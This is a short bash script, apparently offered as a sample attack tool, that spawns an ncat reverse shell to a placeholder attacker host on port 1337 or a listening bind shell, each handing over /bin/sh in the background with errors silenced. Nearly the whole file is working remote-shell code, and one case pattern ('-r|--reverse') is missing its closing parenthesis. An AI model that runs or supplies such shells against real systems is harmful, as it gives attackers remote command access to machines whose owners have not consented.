#!/bin/bash
## Sample ncat bind/reverse shells
evilHost=omgsoevil.lol.com
evilPort=1337
reverse(){
echo 'Kek the planet. reverse shell spawning...'
(ncat $evilHost $evilPort -e /bin/sh) 2>/dev/null & #reverse shell
}
bind(){
echo 'Kek the planet. bind shell spawning...'
(ncat -lp $evilPort -e /bin/sh) 2>/dev/null &
}

case $1 in
-b|--bind)
bind
;;
-r|--reverse
reverse
;;
*)
echo "usage: $0 -[r|--reverse/-b|--bind]"
;;
esac
exit
